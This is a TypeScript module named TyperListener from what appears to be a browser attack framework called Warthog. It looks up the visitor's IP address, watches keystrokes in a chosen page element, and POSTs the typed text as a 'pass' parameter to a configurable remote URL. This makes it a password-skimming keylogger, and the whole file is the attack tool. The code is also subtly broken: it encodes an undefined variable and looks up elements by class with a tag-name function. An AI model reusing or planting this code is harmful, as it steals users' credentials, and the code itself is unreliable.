import { Warthog } from './../warthog';
import { ModuleInterface } from './../interfaces/module';

export class TyperListener implements ModuleInterface {
    url: string;
    id: string;
    method: string;
    ip: string;
    numberChar: number;
    parent: Warthog;

    constructor(parent: Warthog) {
        this.numberChar = 0;
		this.parent = parent;
	}

	init(): void {
        var self: TyperListener = this;

        this.parent.getIP(function(ip) {
            self.ip = JSON.stringify(ip);
            self.eventListener();
        });
	}

    eventListener() {
        var self: TyperListener = this;

        var htmlElement = this.getDomElement();
        htmlElement.onkeyup = function(e) {
            self.execute(this.value);
        }
    }

    getDomElement(): any {
        if (this.method == "id") {
            return document.getElementById(this.id);
        }

        if (this.method == "class") {
            return document.getElementsByTagName(this.id);
        }

        if (this.method == "mixed") {
            return;
        }
    }

    execute(value: string) {
        var len: number = value.length;

        if (len > this.numberChar) {
			var query: string[] = [];
			var xhr: XMLHttpRequest = this.parent.ajax("POST", this.url, null);

            this.numberChar++;

			query.push("pass=" + encodeURI(val));
			query.push("nb_char=" + this.numberChar);
			xhr.send(query.join('&'));
		} else {
			this.numberChar--;
		}

		if (len == 0) {
			this.numberChar = 0;
		}
    }
}
